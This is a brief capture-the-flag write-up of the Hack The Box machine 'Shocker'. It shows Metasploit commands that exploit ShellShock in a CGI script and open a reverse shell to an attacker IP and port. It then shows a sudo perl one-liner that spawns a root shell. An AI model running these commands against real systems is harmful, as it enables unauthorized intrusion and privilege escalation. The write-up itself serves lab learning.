Shocker Write-Up

Aug 21, 2021

Shocker

The Shocker box was part of the easy month on HTB. We gain initial foothold as the shelly user by exploiting the ShellShock vulnerability. We escalate to the root user by exploiting a sudoers misconfiguration that allows us to run perl as root wihtout a password.

Enumerating Port 80 (HTTP)

The webapplication exposes no interesting functionality. Further enumerating the web app through forced browsing using GoBuster; I discover the /cgi-bin/ directory. Given that the machine is called shocker it might be worthwhile to check for the well known ShellShock vulnerability. ShellShock is a parser vulnerability in Bash that allows for arbitrary command execution.

Having identified the `user.sh` bash script we can now test for the ShellShock vulnerability. I will use Metasploit that has a module for exploiting ShellShock. After invoking the module I get a shell as the `shelly` user.

```bash
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set LHOST 10.10.14.167
set LPORT 4444
set payload linux/x64/shell_reverse_tcp

run

Privilege Escalation

Checking first for SUID/GUID binaries I find nothing interesting. Running sudo -l I discover that shelly may run perl as root without a password. In other words, we may run arbitrary perl code as the root user. To obtains a proper interactive root shell I invoke a shell from perl.

sudo /usr/bin/perl -e 'exec "/bin/bash"'
